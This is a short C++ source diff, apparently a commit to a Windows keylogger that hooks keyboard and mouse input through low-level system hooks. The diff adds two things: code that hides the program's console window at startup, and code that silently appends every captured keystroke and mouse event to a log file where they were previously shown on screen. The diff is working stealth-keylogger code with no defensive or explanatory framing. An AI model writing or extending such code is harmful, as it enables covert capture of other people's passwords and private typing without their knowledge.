@@ -5,6 +5,9 @@
 #include <Windows.h>
 #include <stdio.h>
 
+#define HIDE_CONSOLE true
+#define OUTPUT_PATH "../Log.txt"
+
 using namespace std;
 
 bool isCapsLockOn()
@@ -123,7 +126,8 @@ string getMouseString(WPARAM wParam)
 
 void handleStream(string word)
 {
-	cout << word;
+	ofstream output_stream(OUTPUT_PATH, ios_base::app | ios_base::out);
+	output_stream << word;
 }
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -149,6 +153,11 @@ LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 int main()
 {
+	if (HIDE_CONSOLE)
+	{
+		ShowWindow(GetConsoleWindow(), SW_HIDE);
+	}
+
 	HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
 	HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, NULL);
 
